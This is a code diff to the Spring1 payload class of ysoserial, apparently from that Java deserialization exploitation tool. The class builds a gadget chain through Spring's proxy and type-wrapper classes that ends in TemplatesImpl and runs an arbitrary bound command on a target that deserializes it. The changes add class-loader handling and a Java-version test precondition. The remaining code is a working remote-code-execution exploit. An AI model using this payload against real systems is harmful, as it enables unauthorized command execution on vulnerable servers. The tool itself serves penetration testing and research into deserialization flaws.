@@ -13,9 +13,11 @@ import org.springframework.beans.factory.ObjectFactory;
 import ysoserial.annotation.Bind;
 import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
+import ysoserial.payloads.util.Version;
 
 /*
 	Gadget chain:
@@ -48,6 +50,7 @@ import ysoserial.payloads.util.Reflections;
 
 @SuppressWarnings({"rawtypes"})
 @Dependencies({"org.springframework:spring-core:4.1.4.RELEASE","org.springframework:spring-beans:4.1.4.RELEASE"})
+@PayloadTest( precondition = "testCheckJavaVersion" )
 public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
 	
 	@Bind private String command;
@@ -60,24 +63,30 @@ public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
 	}
 
 	public Object getObject() throws Exception {
+		Thread.currentThread().setContextClassLoader( this.getClass().getClassLoader() );
+
 		final Object templates = Gadgets.createTemplatesImpl(command);
 		
 		final ObjectFactory objectFactoryProxy = 
 				Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);
 		
 		final Type typeTemplatesProxy = Gadgets.createProxy((InvocationHandler) 
-				Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")
+				Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler", this.getClass().getClassLoader())
 					.newInstance(objectFactoryProxy), Type.class, Templates.class);
 		
 		final Object typeProviderProxy = Gadgets.createMemoitizedProxy(
 				Gadgets.createMap("getType", typeTemplatesProxy), 
 				forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));
 		
-		final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
+		final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider", this.getClass().getClassLoader());
 		final Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[] {}), 0);
 		Reflections.setFieldValue(mitp, "methodName", "newTransformer");
 
 		return mitp;
+	}
+	
+	public static Boolean testCheckJavaVersion() { 
+		return Version.allowsDefaultAIH();
 	}
 
 	public static void main(final String[] args) throws Exception {
